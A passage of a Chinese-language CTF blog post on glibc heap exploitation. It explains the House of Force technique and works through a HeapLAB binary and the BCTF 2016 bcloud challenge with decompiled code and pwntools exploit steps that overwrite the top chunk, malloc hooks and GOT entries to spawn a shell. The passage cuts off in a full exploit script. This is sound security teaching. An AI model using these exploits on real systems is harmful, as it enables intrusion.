unsorted_bin;<br>                    p-&gt;fd = first_unsorted;<br>                    set_foot(p, size);<br>                &#125;<br>                <span class="hljs-comment">// 下一个 chunk 是 top_chunk</span><br>                <span class="hljs-keyword">else</span> &#123;<br>                    size += nextsize;<br>                    set_head(p, size | PREV_INUSE);<br>                    av-&gt;top = p;<br>                &#125;<br><br>            &#125; <span class="hljs-keyword">while</span> ((p = nextp) != <span class="hljs-number">0</span>);<br><br>        &#125;<br>    <span class="hljs-comment">// 遍历</span><br>    &#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Flowchart"><a href="#Flowchart" class="headerlink" title="Flowchart"></a>Flowchart</h3><h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h4><p><img src="Heap.assets/image-20221018211322536.png" alt="image-20221018211322536"></p><h4 id="sysmalloc-1"><a href="#sysmalloc-1" class="headerlink" title="sysmalloc"></a>sysmalloc</h4><p><img src="Heap.assets/image-20221018211539984.png" alt="image-20221018211539984"></p><h4 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h4><p><img src="Heap.assets/image-20221018211632490.png" alt="image-20221018211632490"></p><h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><p><img src="Heap.assets/image-20221018211608180.png" alt="image-20221018211608180"></p><h2 id="Basic-Vulnerable"><a href="#Basic-Vulnerable" class="headerlink" title="Basic Vulnerable"></a>Basic Vulnerable</h2><h3 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>用一个较大的值来重写top_chunk的大小字段，然后请求足够的内存来弥补顶块和目标数据之间的差距 。以这种方式进行的分配可以环绕VA空间，使得这种技术可以以比堆更低的地址为目标地址。</p><h4 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h4><p>在GLIBC版本&lt;2.29中，top chunk 大小字段在分配期间不受任何完整性检查。如果一个top chunk大小 的字段被覆盖，例如溢出并被替换成一个大的值，那么从该top chunk的后续分配可能会与使用中的内存重叠。在GLIBC&lt;2.30的版本中，从一个被破坏的top chunk中分配的非常大的内存可以环绕VA空间。</p><p>例如，一个top chunk 从地址0x405000开始，驻留在程序数据部分的地址0x404000的目标数据必须被覆盖。使用溢出覆盖顶top chunk 大小字段，将其替换为0xffffffffffffff1的值。接下来，计算将top chunk 移动到目标之前的地址所需的字节数。总数是0xffffffffffffffffff-0x405000字节，以达到VA空间的末端，然后是0x404000-0x20个字节，以在目标地址之前停止。<br>在这个请求top chunk得到服务后，下一个申请的块将与目标数据重叠。</p><h4 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h4><ul><li><p>GLIBC 2.29版引入了顶部块大小字段的合理性检查。<a href="https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=9431108626cdc0b5c1972ee00126228c8dd7166f;hp=e247c77b7d4de26e0f2fbec16e352889bac3781b;hb=30a17d8c95fbfb15c52d1115803b63aaa73a285c;hpb=34f86d61687457aa57d40cf3c230ca8404d40e45">link</a></p><p><img src="Heap.assets/image-20220814132821567.png" alt="image-20220814132821567"></p></li><li><p>GLIBC 2.30版引入了最大分配大小检查，它限制了 house of force”可以弥补的差距大小。<a href="https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=0e3d4dd5163f5fa8fb07b71fb7e318e7b10f5cfd;hp=801ba1f499b566e677b763fc84f8ba86f4f7ccd0;hb=9bf8e29ca136094f73f69f725f15c51facc97206;hpb=52faba65f84ee5a8d82ff813bcfa0ee5f4d480cf">link</a></p><p><img src="Heap.assets/image-20220814133216729.png" alt="image-20220814133216729"></p></li></ul><h4 id="示例一：house-of-force"><a href="#示例一：house-of-force" class="headerlink" title="示例一：house_of_force"></a>示例一：house_of_force</h4><blockquote><p>文件详见附件 <a href="attachment/house_of_force/house_of_force">house_of_force</a></p></blockquote><h5 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h5><ul><li>修改target的值</li><li>获取shell</li></ul><h5 id="检查安全措施"><a href="#检查安全措施" class="headerlink" title="检查安全措施"></a>检查安全措施</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(fanya㉿ferity)-[~/…/heap/heaplab/part1/house_of_force]<br>└─$ checksec house_of_force                                 <br>[*] &#x27;/home/fanya/Desktop/heap/heaplab/part1/house_of_force/house_of_force&#x27;<br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br>    RUNPATH:  &#x27;../.glibc/glibc_2.28_no-tcache&#x27;<br></code></pre></td></tr></table></figure><h5 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h5><p>程序在运行时已给出libc地址及heap地址。</p><p>在<code>read(0, m_array[index++], v5 + 8);</code>中明显的溢出8个字节。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 num; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">size_t</span> v5; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index; <span class="hljs-comment">// [rsp+14h] [rbp-3Ch]</span><br>  <span class="hljs-type">char</span> *m; <span class="hljs-comment">// [rsp+18h] [rbp-38h]</span><br>  <span class="hljs-type">char</span> *m_array[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+48h] [rbp-8h]</span><br><br>  v9 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n===============&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|   HeapLAB   |  House of Force&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;===============\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;puts() @ %p\n&quot;</span>, &amp;<span class="hljs-built_in">puts</span>);<br>  m = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x88</span>uLL);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap @ %p\n&quot;</span>, m - <span class="hljs-number">16</span>);<br>  <span class="hljs-built_in">free</span>(m);<br>  <span class="hljs-built_in">memset</span>(m_array, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(m_array));<br>  index = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n1) malloc %u/%u\n&quot;</span>, index, <span class="hljs-number">4LL</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2) target&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3) quit&quot;</span>);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);<br>      num = read_num();<br>      <span class="hljs-keyword">if</span> ( num != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\ntarget: %s\n&quot;</span>, target);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">3</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( index &gt; <span class="hljs-number">3</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;maximum requests reached&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: &quot;</span>);<br>        v4 = read_num();<br>        m_array[index] = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(v4);<br>        <span class="hljs-keyword">if</span> ( m_array[index] )<br>        &#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data: &quot;</span>);<br>          v5 = malloc_usable_size(m_array[index]);<br>          read(<span class="hljs-number">0</span>, m_array[index++], v5 + <span class="hljs-number">8</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;request failed&quot;</span>);<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><ul><li>由于堆上输入的时候恰有8个字节的溢出，修改top_chunk，从而达到任意地址写。</li><li>修改__malloc_hook 为system的地址。</li></ul><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul><li><p>使用8字节溢出修改top_chunk的size为0xffffffffffffffff</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">malloc(<span class="hljs-number">24</span>, <span class="hljs-string">b&quot;Y&quot;</span>*<span class="hljs-number">24</span> + p64(<span class="hljs-number">0xffffffffffffffff</span>)) <br></code></pre></td></tr></table></figure><p><img src="Heap.assets/image-20220816100317563.png" alt="image-20220816100317563"></p></li><li><p>计算与目标地址的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Calculate the &quot;wraparound&quot; distance between two addresses.                                             </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delta</span>(<span class="hljs-params">x, y</span>):<br><span class="hljs-keyword">return</span> (<span class="hljs-number">0xffffffffffffffff</span> - x) + y <br>distance = delta(heap + <span class="hljs-number">0x20</span>, elf.sym.target - <span class="hljs-number">0x20</span>)<br><span class="hljs-comment"># heap -&gt; heap addr 0x20 -&gt;first chunk size</span><br>distance = (libc.sym.__malloc_hook - <span class="hljs-number">0x20</span>) - (heap + <span class="hljs-number">0x20</span>)<br></code></pre></td></tr></table></figure></li><li><p>创建chunk，达到任意地址写</p><ul><li><p>modify_target</p><pre><code class="hljs"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">malloc(distance, <span class="hljs-string">b&quot;a&quot;</span>)<br>malloc(<span class="hljs-number">24</span>, <span class="hljs-string">b&#x27;aaaaaaa&#x27;</span>)<br></code></pre></td></tr></table></figure></code></pre><p>  <img src="Heap.assets/image-20220816100752788.png" alt="image-20220816100752788"></p></li><li><p>drop shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">malloc(distance, <span class="hljs-string">b&quot;/bin/sh&quot;</span>)<br>malloc(<span class="hljs-number">24</span>, p64(libc.sym.system))<br>cmd = heap + <span class="hljs-number">0x30</span><br>malloc(cmd, <span class="hljs-string">b&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="Heap.assets/image-20220816101120303.png" alt="image-20220816101120303"></p></li></ul></li></ul><h4 id="示例二：BCTF-2016-bcloud"><a href="#示例二：BCTF-2016-bcloud" class="headerlink" title="示例二：BCTF 2016  bcloud"></a>示例二：BCTF 2016  bcloud</h4><blockquote><p>文件详见附件 <a href="attachment/bctf_2016_bcloud/bcloud">bcloud</a></p></blockquote><h5 id="检查安全措施-1"><a href="#检查安全措施-1" class="headerlink" title="检查安全措施"></a>检查安全措施</h5><p><img src="Heap.assets/image-20220814164430494.png" alt="image-20220814164430494"></p><h5 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h5><ul><li><p>将程序打完注释后为<a href="attachment/bctf_2016_bcloud/bcloud.idb">bcloud.idb</a></p></li><li><p>在<code>my_input</code>函数中在末尾 a2 的位置加入一个<code>\x00</code>, 而在name_init中s本为64的大小，<code>my_input</code>也是64，但会在65的位置加一个<code>\x00</code>, 但是由于后面的v2赋值的操作，将<code>\x00</code>覆盖为了别的值，而且会在后面的<code>some_output</code>泄露出v2的堆地址。由于字符串的结束标志为<code>\x00</code>，所以<code>strcpy </code>和 <code>puts</code> 函数都会对这个v2的堆地址进行操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">my_input</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">char</span> a3)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [esp+1Bh] [ebp-Dh] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a2; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">1u</span>) &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">if</span> ( buf == a3 )<br>      <span class="hljs-keyword">break</span>;<br>    *(_BYTE *)(a1 + i) = buf;<br>  &#125;<br>  *(_BYTE *)(i + a1) = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> i;<br>&#125;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">name_init</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-5Ch] BYREF</span><br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// [esp+5Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your name:&quot;</span>);<br>  my_input((<span class="hljs-type">int</span>)s, <span class="hljs-number">64</span>, <span class="hljs-string">&#x27;\n&#x27;</span>);<br>  v2 = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>u);<br>  name_chunk_0x40 = (<span class="hljs-type">int</span>)v2;<br>  <span class="hljs-built_in">strcpy</span>(v2, s);<br>  some_output(v2);                              <span class="hljs-comment">// 信息泄露</span><br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">some_output</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hey %s! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!\n&quot;</span>, a1);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now let&#x27;s set synchronization options.&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在后面的<code>org_host_init</code>函数中对于org及host的初始化也像上述一样，我们注意到<code>strcpy</code>在给org赋值的时候会将org字符串、org返回地址以及host字符串全部赋给org，从而造成堆溢出构造我们使用<code>house of force</code>的条件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">org_host_init</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> org_chunk_con[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-9Ch] BYREF</span><br>  <span class="hljs-type">char</span> *org_chunk; <span class="hljs-comment">// [esp+5Ch] [ebp-5Ch]</span><br>  <span class="hljs-type">char</span> host_chunk_con[<span class="hljs-number">68</span>]; <span class="hljs-comment">// [esp+60h] [ebp-58h] BYREF</span><br>  <span class="hljs-type">char</span> *host_chunk; <span class="hljs-comment">// [esp+A4h] [ebp-14h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+ACh] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">memset</span>(org_chunk_con, <span class="hljs-number">0</span>, <span class="hljs-number">0x90</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Org:&quot;</span>);<br>  my_input((<span class="hljs-type">int</span>)org_chunk_con, <span class="hljs-number">64</span>, <span class="hljs-number">10</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Host:&quot;</span>);<br>  my_input((<span class="hljs-type">int</span>)host_chunk_con, <span class="hljs-number">64</span>, <span class="hljs-number">10</span>);<br>  host_chunk = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>u);<br>  org_chunk = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>u);<br>  org_chunk_addr = (<span class="hljs-type">int</span>)org_chunk;<br>  host_chunk_addr = (<span class="hljs-type">int</span>)host_chunk;<br>  <span class="hljs-built_in">strcpy</span>(host_chunk, host_chunk_con);<br>  <span class="hljs-built_in">strcpy</span>(org_chunk, org_chunk_con);    <span class="hljs-comment">// &lt;---</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OKay! Enjoy:)&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在后续的<code>new_note</code>、<code>show_note</code> 、<code>edit_note</code>、 <code>del_note</code>便为常规操作，值得注意的是程序最多创建10个node，将其地址和大小分别储存在<code>node_list</code>和<code>node_size_list</code>中，从而方便我们使用<code>edit_note</code>的时候修改某些值。</p></li></ul><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><ul><li>泄漏 heap 地址</li><li>利用溢出修改 top chunk 的 size</li><li>分配一个 chunk，将 top chunk 转移到 node_size_list 数组前面</li><li>再次分配 chunk，即可覆盖 node_list ，并利用 Edit 修改其内容</li><li>修改 <code>free@got.plt</code> 为 <code>puts@got.plt</code>，泄漏 libc</li><li>修改 <code>atoi@got.plt</code> 为 <code>system@got.plt</code>，得到 shell</li></ul><h5 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul><li><p>使用name的输入 -》 泄露堆地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># leak the heap addr</span><br><span class="hljs-comment"># dbg()</span><br>io.sendafter(<span class="hljs-string">&quot;name:\n&quot;</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x40</span>)<br>heap = u32(io.recvuntil(<span class="hljs-string">b&quot;! Welcome to BCTF&quot;</span>, drop=<span class="hljs-literal">True</span>)[-<span class="hljs-number">4</span>:])<br>log.info(<span class="hljs-string">f&quot;heap_addr -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="Heap.assets/image-20220814182744179.png" alt="image-20220814182744179"></p></li><li><p>利用org和host的输入 -》 修改top chunk的size为-1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># overflow</span><br>io.sendafter(<span class="hljs-string">&quot;Org:\n&quot;</span>, <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">0x40</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Host:\n&quot;</span>, p32(<span class="hljs-number">0xffffffff</span>))<br><span class="hljs-comment"># dbg()</span><br></code></pre></td></tr></table></figure><p><img src="Heap.assets/image-20220814194641198.png" alt="image-20220814194641198"></p></li><li><p>计算hack_chunk 的大小 将top_chunk移动至bss段</p><p>0x804b0a0 -&gt; note_size_list</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">new((<span class="hljs-number">0x804b0a0</span> - <span class="hljs-number">0x10</span>) - (heap + <span class="hljs-number">0xd0</span>), <span class="hljs-string">b&#x27;AAAA&#x27;</span>)<br></code></pre></td></tr></table></figure></li><li><p>新建一个chunk 覆盖note_list 数组，并修改其内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span><br>payload += p32(elf.got.free) <span class="hljs-comment"># note[0]</span><br>payload += p32(elf.got.atoi) * <span class="hljs-number">2</span> <span class="hljs-comment"># note[1] note[2]</span><br>new(<span class="hljs-number">0x8c</span>, payload)<br><span class="hljs-comment"># dbg()</span><br></code></pre></td></tr></table></figure><p><img src="Heap.assets/image-20220814212052885.png" alt="image-20220814212052885"></p></li><li><p>修改free_got 为 puts_got 泄露libc地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># free@got.plt -&gt; puts@plt</span><br>edit(<span class="hljs-number">0</span>, p32(elf.plt.puts))<br>dele(<span class="hljs-number">1</span>)<br>atoi_addr = u32(io.recvn(<span class="hljs-number">4</span>))<br>io.recv()<br>libc.address = atoi_addr - libc.sym.atoi<br>log.info(<span class="hljs-string">f&quot;libc addr -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="Heap.assets/image-20220814212638115.png" alt="image-20220814212638115"></p></li><li><p>修改 atoi_got 为 system_got， 获得shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">system_addr = libc.sym.system<br>log.info(<span class="hljs-string">f&quot;system addr -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc.sym.system)&#125;</span>&quot;</span>)<br><span class="hljs-comment"># dbg()</span><br>io.sendline(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>edit(<span class="hljs-number">2</span>, p32(system_addr))<br>io.sendlineafter(<span class="hljs-string">b&#x27;option---&gt;&gt;\n&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="Heap.assets/image-20220814214814810.png" alt="image-20220814214814810"></p></li></ul><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = context.binary = ELF(<span class="hljs-string">&#x27;./bcloud&#x27;</span>)<br>libc = elf.libc<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span 